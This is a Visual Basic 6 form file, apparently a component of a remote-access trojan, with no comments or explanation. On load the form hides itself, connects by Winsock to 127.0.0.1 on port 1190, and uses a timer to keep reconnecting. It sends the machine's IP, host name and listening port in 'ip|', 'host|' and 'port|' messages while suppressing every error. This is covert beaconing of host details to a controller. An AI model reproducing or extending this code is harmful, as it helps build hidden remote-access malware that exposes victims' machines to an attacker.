VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "mswinsck.ocx"
Begin VB.Form Form3 
   Caption         =   "Form3"
   ClientHeight    =   2670
   ClientLeft      =   -7170
   ClientTop       =   690
   ClientWidth     =   4020
   LinkTopic       =   "Form3"
   ScaleHeight     =   2670
   ScaleWidth      =   4020
   Begin VB.Timer Timer1 
      Interval        =   1000
      Left            =   480
      Top             =   0
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   0
      Top             =   0
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Label port 
      Caption         =   "PORT"
      Height          =   495
      Left            =   1440
      TabIndex        =   2
      Top             =   720
      Width           =   1455
   End
   Begin VB.Label host 
      Caption         =   "HOST"
      Height          =   495
      Left            =   1320
      TabIndex        =   1
      Top             =   1440
      Width           =   1575
   End
   Begin VB.Label ip 
      Caption         =   "ÝP"
      Height          =   375
      Left            =   1440
      TabIndex        =   0
      Top             =   240
      Width           =   1335
   End
End
Attribute VB_Name = "Form3"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub gonder()
On Error Resume Next
Winsock1.SendData "ip|" + frmMain.Caption
Winsock1.SendData "host|" + Form1.Winsock1.LocalHostName
Winsock1.SendData "port|" + Form1.Winsock1.LocalPort
End Sub


Private Sub Form_Load()
Me.Hide
Me.Visible = False
Winsock1.Close
Winsock1.Connect "127.0.0.1", "1190"
Timer1.Enabled = True
End Sub

Private Sub Timer1_Timer()
On Error Resume Next
On Error Resume Next
If Winsock1.State <> 7 Then
Timer1.Enabled = False
Else
Timer1.Enabled = True
Winsock1.Close
Winsock1.Connect "127.0.0.1", "1190"
gonder
End If
End Sub

Private Sub Winsock1_Close()
On Error Resume Next
Timer1.Enabled = True
End Sub

Private Sub Winsock1_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
On Error Resume Next
Timer1.Enabled = True
End Sub
